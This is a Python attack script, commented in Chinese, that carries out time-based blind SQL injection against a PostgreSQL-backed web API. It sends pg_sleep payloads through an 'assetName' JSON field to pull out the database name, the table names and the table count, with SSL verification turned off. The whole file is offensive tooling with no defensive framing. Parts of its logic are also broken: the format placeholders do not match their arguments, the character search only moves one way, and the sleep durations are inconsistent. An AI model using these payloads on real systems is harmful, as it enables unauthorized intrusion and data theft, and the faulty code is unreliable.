import requests
import argparse

# 目标URL
url = ""

# 自定义HTTP头
headers = {
    "Host": "",
    "Cookie": "",
    "Sec-Ch-Ua": "\"Chromium\";v=\"118\", \"Microsoft Edge\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61",
    "Sec-Ch-Ua-Platform": "macOS",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Connection": "close"
}

# 禁用SSL证书验证
requests.packages.urllib3.disable_warnings()

# 解析命令行参数
parser = argparse.ArgumentParser(description="猜解数据库信息")
parser.add_argument("-v", "--verbose", action="store_true", help="输出详细信息")
args = parser.parse_args()

def log_verbose(message):
    if args.verbose:
        print(message)

def binary_search_length(payload_template, min_length, max_length):
    while min_length <= max_length:
        mid_length = (min_length + max_length) // 2
        payload = payload_template.format(mid_length)
        data = {
            "type": "",
            "vulnStatus": "",
            "pageIndex": 1,
            "pageSize": 10,
            "assetName": payload
        }

        response = requests.post(url, headers=headers, json=data, verify=False)
        log_verbose(f"Payload: {payload}")
        log_verbose(f"Response time: {response.elapsed.total_seconds()} seconds")

        if response.elapsed.total_seconds() >= 4:
            min_length = mid_length + 1  # 继续查找更长的长度
        else:
            max_length = mid_length - 1  # 查找更短的长度

    return max_length

def interact_module(option):
    if option == 1:
        # 猜解当前数据库名的长度
        current_database_length = binary_search_length(
            "1'/**/and/**/(select/**/length(current_database()))/**/between/**/{}/**/and/**/{}/**/and/**/(select'1'from/**/pg_sleep(4))/**/='1",
            1, 30
        )
        print(f"Found current database name length: {current_database_length}")

        # 猜测数据库名
        database_name = ""
        for char_position in range(1, current_database_length + 1):
            found = False
            ascii_range_start = 32
            ascii_range_end = 127
            while ascii_range_start <= ascii_range_end:
                mid_ascii = (ascii_range_start + ascii_range_end) // 2
                payload = f"1'/**/and/**/(select/**/ascii(substr(current_database(),{char_position},1)))/**/between/**/{mid_ascii}/**/and/**/{mid_ascii}/**/and/**/(select'1'from/**/pg_sleep(4))/**/='1"
                data = {
                    "type": "",
                    "vulnStatus": "",
                    "pageIndex": 1,
                    "pageSize": 10,
                    "assetName": payload
                }

                response = requests.post(url, headers=headers, json=data, verify=False)
                log_verbose(f"Payload: {payload}")
                log_verbose(f"Response time: {response.elapsed.total_seconds()} seconds")

                if response.elapsed.total_seconds() >= 4:
                    database_name += chr(mid_ascii)
                    print(f"Found character: {chr(mid_ascii)} (ASCII: {mid_ascii}) at position {char_position}")
                    found = True
                    break
                else:
                    ascii_range_end = mid_ascii - 1  # 查找更小的ASCII值

            if not found:
                print("Failed to find character at position:", char_position)
                break

        print(f"Database name: {database_name}")

    elif option == 2:
        # 猜解第一个表名长度
        table_name_length = binary_search_length(
            "1'/**/and/**/(select/**/length(relname)/**/from/**/pg_stat_user_tables/**/limit/**/1/**/offset/**/0)/**/between/**/{}/**/and/**/{}/**/and/**/(select'1'from/**/pg_sleep(2))/**/='1",
            1, 100
        )
        print(f"Found table name length: {table_name_length}")

        # 猜测第一个表名
        first_table_name = ""
        for char_position in range(1, table_name_length + 1):
            found = False
            ascii_range_start = 32
            ascii_range_end = 127
            while ascii_range_start <= ascii_range_end:
                mid_ascii = (ascii_range_start + ascii_range_end) // 2
                payload = f"1'/**/and/**/(select/**/ascii(substr(relname,{char_position},1))/**/from/**/pg_stat_user_tables/**/limit/**/1/**/offset/**/0)/**/between/**/{mid_ascii}/**/and/**/{mid_ascii}/**/and/**/(select'1'from/**/pg_sleep(4))/**/='1"
                data = {
                    "type": "",
                    "vulnStatus": "",
                    "pageIndex": 1,
                    "pageSize": 10,
                    "assetName": payload
                }

                response = requests.post(url, headers=headers, json=data, verify=False)
                log_verbose(f"Payload: {payload}")
                log_verbose(f"Response time: {response.elapsed.total_seconds()} seconds")

                if response.elapsed.total_seconds() >= 4:
                    first_table_name += chr(mid_ascii)
                    print(f"Found character at position {char_position}: {chr(mid_ascii)} (ASCII: {mid_ascii})")
                    found = True
                    break
                else:
                    ascii_range_end = mid_ascii - 1  # 查找更小的ASCII值

            if not found:
                print(f"Failed to find character at position {char_position}")
                break

        print(f"First table name: {first_table_name}")

    elif option == 3:
        # 猜解表的数量
        table_count = binary_search_length(
            "1'/**/and/**/(select/**/count(*)/**/from/**/pg_stat_user_tables)/**/between/**/{}/**/and/**/{}/**/and/**/(select'1'from/**/pg_sleep(4))/**/='1",
            1, 1000
        )
        print(f"Found table count: {table_count}")

# 交互式选择模块
while True:
    print("选择要执行的模块:")
    print("1. 猜解当前数据库名")
    print("2. 猜解第一个表名")
    print("3. 猜解表的数量")
    print("4. 退出")

    option = input("请选择一个选项: ")

    if option == "1":
        interact_module(1)
    elif option == "2":
        interact_module(2)
    elif option == "3":
        interact_module(3)
    elif option == "4":
        break
    else:
        print("无效的选项，请重新选择。")
